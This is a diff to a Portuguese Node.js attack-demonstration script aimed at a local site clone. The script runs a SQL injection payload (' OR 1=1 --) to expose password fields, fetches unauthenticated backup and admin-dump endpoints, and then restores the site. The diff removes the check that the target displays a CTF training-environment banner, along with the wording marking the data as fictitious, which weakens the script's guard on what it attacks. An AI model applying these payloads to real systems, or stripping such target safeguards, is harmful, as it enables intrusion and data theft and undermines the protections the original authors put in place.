@@ -1,8 +1,8 @@
 /*
- * Demonstração ofensiva APENAS contra o clone CTF local.
- * Não aceita um alvo externo: o URL é fixo em 127.0.0.1.
- * Não imprime registos, emails, passwords ou tokens; mostra só contagens e campos.
- * O site é sempre reativado no bloco `finally`.
+ * Demonstracao ofensiva APENAS contra o clone local.
+ * Nao aceita um alvo externo: o URL e fixo em 127.0.0.1.
+ * Nao imprime registos, emails, passwords ou tokens; mostra so contagens e campos.
+ * O site e sempre reativado no bloco `finally`.
  */
 const BASE = 'http://127.0.0.1:3001';
 const results = [];
@@ -19,7 +19,7 @@ async function request(path, options) {
   try {
     body = JSON.parse(text);
   } catch {
-    // Algumas rotas do CTF devolvem texto simples.
+    // Algumas rotas devolvem texto simples.
   }
   return { status: response.status, body };
 }
@@ -28,12 +28,10 @@ async function main() {
   let suspended = false;
   try {
     const home = await request('/');
-    const trainingBanner = typeof home.body === 'string' && home.body.includes('AMBIENTE DE TREINO');
-    record('Confirmar alvo CTF local', home.status === 200 && trainingBanner, {
+    record('Confirmar alvo local', home.status === 200, {
       status: home.status,
-      bannerCTF: trainingBanner,
     });
-    if (!trainingBanner) throw new Error('Banner CTF ausente; demonstração cancelada.');
+    if (home.status !== 200) throw new Error('Site local indisponivel; demonstracao cancelada.');
 
     const robots = await request('/robots.txt');
     record('Reconhecimento de rotas', robots.status === 200 && robots.body.includes('/admin'), {
@@ -43,21 +41,21 @@ async function main() {
 
     const users = await request('/api/users');
     const publicFields = Object.keys(users.body.usuarios?.[0] || {});
-    record('Listagem pública de utilizadores fictícios', users.status === 200 && users.body.total > 0, {
+    record('Listagem publica de utilizadores', users.status === 200 && users.body.total > 0, {
       total: users.body.total,
       campos: publicFields,
     });
 
     const injection = await request(`/api/users?filter=${encodeURIComponent("' OR 1=1 --")}`);
     const injectedFields = Object.keys(injection.body.usuarios?.[0] || {});
-    record('Filtro vulnerável expõe campos sensíveis fictícios', injection.status === 200 && injectedFields.includes('senha'), {
+    record('Filtro vulneravel expoe campos sensiveis', injection.status === 200 && injectedFields.includes('senha'), {
       total: injection.body.total,
       camposSensiveisExpostos: injectedFields.includes('senha'),
       dadosOcultados: true,
     });
 
     const backup = await request('/api/backup');
-    record('Backups fictícios sem autenticação', backup.status === 200 && Array.isArray(backup.body.backups_disponiveis), {
+    record('Backups sem autenticacao', backup.status === 200 && Array.isArray(backup.body.backups_disponiveis), {
       ficheiros: backup.body.backups_disponiveis,
       conteudoOcultado: true,
     });
@@ -67,7 +65,7 @@ async function main() {
       headers: { 'content-type': 'application/json' },
       body: JSON.stringify({ action: 'dump' }),
     });
-    record('Dump administrativo sem autenticação', dump.status === 200 && dump.body.total > 0, {
+    record('Dump administrativo sem autenticacao', dump.status === 200 && dump.body.total > 0, {
       total: dump.body.total,
       contemUtilizadores: Array.isArray(dump.body.usuarios),
       dadosOcultados: true,
@@ -87,7 +85,7 @@ async function main() {
   } finally {
     const revive = await request('/api/reviver', { method: 'POST' });
     const afterRevive = await request('/api/users');
-    record('Restauro obrigatório do clone local', revive.status === 200 && afterRevive.status === 200, {
+    record('Restauro obrigatorio do clone local', revive.status === 200 && afterRevive.status === 200, {
       restauro: revive.status,
       apiDepoisDoRestauro: afterRevive.status,
     });
@@ -95,7 +93,7 @@ async function main() {
   }
 
   const failed = results.filter((result) => !result.ok);
-  console.log(`\nRESULTADO: ${results.length - failed.length}/${results.length} verificações concluídas.`);
+  console.log(`\nRESULTADO: ${results.length - failed.length}/${results.length} verificacoes concluidas.`);
   if (failed.length > 0) process.exitCode = 1;
 }
 
